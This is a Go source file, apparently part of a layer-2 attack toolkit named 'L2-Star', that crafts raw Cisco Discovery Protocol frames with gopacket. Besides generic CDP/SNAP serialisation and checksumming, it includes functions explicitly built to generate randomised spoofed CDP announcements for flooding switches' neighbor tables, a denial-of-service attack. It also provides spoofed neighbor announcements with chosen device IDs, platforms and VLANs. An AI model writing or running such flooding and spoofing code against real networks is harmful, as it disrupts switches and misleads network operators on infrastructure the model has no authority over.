package cdp

import (
	"encoding/binary"
	"net"

	"fmt"
	"math/rand"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

// CustomCDPLayer implements gopacket.SerializableLayer for Cisco Discovery Protocol
type CustomCDPLayer struct {
	layers.BaseLayer
	Version      byte
	TTL          byte
	Checksum     uint16
	DeviceID     string
	PortID       string
	Platform     string
	Software     string
	Capabilities uint32
	NativeVLAN   uint16
}

// LayerTypeCustomCDP registers our custom layer
var LayerTypeCustomCDP = gopacket.RegisterLayerType(2001, gopacket.LayerTypeMetadata{Name: "CustomCDP", Decoder: gopacket.DecodeFunc(nil)})

func (c *CustomCDPLayer) LayerType() gopacket.LayerType {
	return LayerTypeCustomCDP
}

func (c *CustomCDPLayer) SerializeTo(b gopacket.SerializeBuffer, opts gopacket.SerializeOptions) error {
	length := 4

	deviceIDBytes := []byte(c.DeviceID)
	portIDBytes := []byte(c.PortID)
	platformBytes := []byte(c.Platform)
	softwareBytes := []byte(c.Software)

	length += 4 + len(deviceIDBytes)
	length += 4 + len(portIDBytes)
	length += 4 + len(platformBytes)
	length += 4 + len(softwareBytes)

	if c.Capabilities != 0 {
		length += 4 + 4
	}
	if c.NativeVLAN != 0 {
		length += 4 + 2
	}

	bytes, err := b.PrependBytes(length)
	if err != nil {
		return err
	}

	bytes[0] = c.Version
	bytes[1] = c.TTL

	offset := 4

	writeTLV := func(t uint16, v []byte) {
		binary.BigEndian.PutUint16(bytes[offset:], t)
		binary.BigEndian.PutUint16(bytes[offset+2:], uint16(4+len(v)))
		copy(bytes[offset+4:], v)
		offset += 4 + len(v)
	}

	writeTLV(0x0001, deviceIDBytes)
	writeTLV(0x0003, portIDBytes)

	if c.Capabilities != 0 {
		capBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(capBytes, c.Capabilities)
		writeTLV(0x0004, capBytes)
	}

	writeTLV(0x0005, softwareBytes)
	writeTLV(0x0006, platformBytes)

	if c.NativeVLAN != 0 {
		vlanBytes := make([]byte, 2)
		binary.BigEndian.PutUint16(vlanBytes, c.NativeVLAN)
		writeTLV(0x000a, vlanBytes)
	}

	if opts.ComputeChecksums {
		csum := checksum(bytes)
		binary.BigEndian.PutUint16(bytes[2:], csum)
	}

	return nil
}

// Basic checksum function
func checksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i < len(data)-1; i += 2 {
		sum += uint32(data[i])<<8 | uint32(data[i+1])
	}
	if len(data)%2 != 0 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for sum > 0xffff {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

// CraftCDPNeighborAnnouncement creates a specific CDP packet to announce a neighbor
func CraftCDPNeighborAnnouncement(srcMAC net.HardwareAddr, deviceID, portID, platform, software string, capabilities uint32, nativeVLAN uint16) ([]byte, error) {
	eth := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       net.HardwareAddr{0x01, 0x00, 0x0c, 0xcc, 0xcc, 0xcc},
		EthernetType: layers.EthernetTypeLLC,
	}

	llc := layers.LLC{
		DSAP:    0xaa,
		SSAP:    0xaa,
		Control: 0x03,
	}

	snapAndCdp := &CustomSNAPCDPLayer{
		DeviceID:     deviceID,
		PortID:       portID,
		Platform:     platform,
		Software:     software,
		Capabilities: capabilities,
		NativeVLAN:   nativeVLAN,
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	err := gopacket.SerializeLayers(buf, opts, &eth, &llc, snapAndCdp)
	if err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

// CraftCDPDoS creates a random CDP packet for flooding to fill neighbor tables
func CraftCDPDoS(srcMAC net.HardwareAddr) ([]byte, error) {
	rand.Seed(time.Now().UnixNano())
	deviceID := fmt.Sprintf("DoS-Device-%d", rand.Intn(100000))
	portID := fmt.Sprintf("Eth0/%d", rand.Intn(24))
	return CraftCDPNeighborAnnouncement(srcMAC, deviceID, portID, "Linux", "L2-Star", 0, 0)
}

// CraftCDPFloodPacket creates a random CDP packet for flooding
func CraftCDPFloodPacket(srcMAC net.HardwareAddr, deviceID string, portID string) ([]byte, error) {
	return CraftCDPNeighborAnnouncement(srcMAC, deviceID, portID, "Linux", "L2-Star", 0, 0)
}

type CustomSNAPCDPLayer struct {
	layers.BaseLayer
	DeviceID     string
	PortID       string
	Platform     string
	Software     string
	Capabilities uint32
	NativeVLAN   uint16
}

var LayerTypeCustomSNAPCDP = gopacket.RegisterLayerType(2002, gopacket.LayerTypeMetadata{Name: "CustomSNAPCDP", Decoder: gopacket.DecodeFunc(nil)})

func (c *CustomSNAPCDPLayer) LayerType() gopacket.LayerType {
	return LayerTypeCustomSNAPCDP
}

func (c *CustomSNAPCDPLayer) SerializeTo(b gopacket.SerializeBuffer, opts gopacket.SerializeOptions) error {
	tlvLen := 0
	tlvLen += 4 + len(c.DeviceID)
	tlvLen += 4 + len(c.PortID)
	tlvLen += 4 + len(c.Platform)
	tlvLen += 4 + len(c.Software)

	if c.Capabilities != 0 {
		tlvLen += 4 + 4
	}
	if c.NativeVLAN != 0 {
		tlvLen += 4 + 2
	}

	totalLen := 5 + 4 + tlvLen

	bytes, err := b.PrependBytes(totalLen)
	if err != nil {
		return err
	}

	bytes[0] = 0x00
	bytes[1] = 0x00
	bytes[2] = 0x0c
	bytes[3] = 0x20
	bytes[4] = 0x00

	bytes[5] = 0x01
	bytes[6] = 180

	offset := 9
	writeTLV := func(t uint16, v []byte) {
		binary.BigEndian.PutUint16(bytes[offset:], t)
		binary.BigEndian.PutUint16(bytes[offset+2:], uint16(4+len(v)))
		copy(bytes[offset+4:], v)
		offset += 4 + len(v)
	}

	writeTLV(0x0001, []byte(c.DeviceID))
	writeTLV(0x0003, []byte(c.PortID))
	writeTLV(0x0005, []byte(c.Software))
	writeTLV(0x0006, []byte(c.Platform))

	if c.Capabilities != 0 {
		capBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(capBytes, c.Capabilities)
		writeTLV(0x0004, capBytes)
	}
	if c.NativeVLAN != 0 {
		vlanBytes := make([]byte, 2)
		binary.BigEndian.PutUint16(vlanBytes, c.NativeVLAN)
		writeTLV(0x000a, vlanBytes)
	}

	if opts.ComputeChecksums {
		csum := checksum(bytes[5:])
		binary.BigEndian.PutUint16(bytes[7:], csum)
	}

	return nil
}
